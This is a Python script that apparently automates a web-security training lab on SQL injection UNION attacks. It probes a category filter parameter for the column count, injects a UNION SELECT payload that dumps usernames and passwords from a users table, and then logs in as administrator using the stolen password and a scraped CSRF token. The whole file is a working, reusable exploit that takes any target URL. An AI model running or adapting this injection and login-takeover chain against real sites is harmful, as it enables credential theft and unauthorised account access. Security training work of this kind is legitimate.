# SQL injection UNION attack, retrieving multiple values in a single column

import sys
import requests
import urllib3
import urllib.parse
import re
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % payload)
	return r

def get_password(s, url):
	filter_path = url + '/filter?category='
	data_payload = "' UNION SELECT NULL, username || ':' || password FROM users--"
	print('[+] Retrieving usernames and passwords...\n')
	r = s.get(filter_path + data_payload)
	time.sleep(1)
	res = r.text
	password = re.search("administrator:(.*)</", res).group(1)
	passes = re.findall("<th>(.*):(.*)</t", res)
	for p in passes:
		if len(p[0]) < 8:
			print('[+] %s:\t\t%s' % (p[0], p[1]))
		else:
			print('[+] %s:\t%s' % (p[0], p[1]))
	print('\n[+] Found Administrator password:    \t%s' % password)
	return password

def get_columns_number(s, url, payload):
	filter_path = url + '/filter?category='
	if payload == "SOLUTION1":
		print('[+] Using the UNION SELECT method to retrieve the number of columns...')
		payload = "' UNION SELECT NULL--"
		for i in range(1, 8):
			if send_payload(s, filter_path, payload).status_code == 200:
				print('\n[+] Number of Columns returned:\t%s' % i)
				return i
			else:
				payload = payload[:-2]
				payload += ", NULL--"
	elif payload == "SOLUTION2":
		print('[+] Using the ORDER BY method to retrieve the number of columns...')
		for i in range(1, 8):
			payload = "' ORDER BY %s--" % i
			if send_payload(s, filter_path, payload).status_code == 500:
				print('\n[+] Number of Columns returned:\t%s' % (i - 1))
				return i - 1
	else:
		r = send_payload(s, filter_path, payload)
		if re.search(f'<h1>(.*)</h1>', r.text):
			print('\n[+] Response:\n\t%s' % re.search(f'<h1>(.*)</h1>', r.text).group(1))
			sys.exit(0)
		return r

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection UNION attack, retrieving multiple values in a single column')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		if not "SOLUTION" in payload:
			r = send_payload(s, url + '/filter?category=', payload)
			time.sleep(1)
			if re.search(f'<h1>(.*)</h1>', r.text):
				print('\n[+] Response:\n\t%s' % re.search(f'<h1>(.*)</h1>', r.text).group(1))
				sys.exit(0)
			res = r.text
			print(res)
		else:
			print('[+] Determining the number of columns returned by the query...')
			time.sleep(1)
			columns_count = get_columns_number(s, url, payload) 
			if columns_count:
				password = get_password(s, url)
				if password:
					print('\n[+] Trying to log in as administrator user...')
					login_path = url + "/login"
					r = s.get(login_path)
					csrf_token = get_csrf_token(r)
					login_data = {"csrf": csrf_token, "password": password, "username": "administrator"}
					r = s.post(login_path, data=login_data)
					time.sleep(1)
					res = r.text
					if 'Your username is: administrator' in res:
						print('\n[+] Successfully logged in as Administrator !')
					else:
						print('\n[-] Exploit Failed to log in as Administrator <!>')
				else:
					print('\n[-] Exploit Failed to find the password <!>')
			else:
				print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
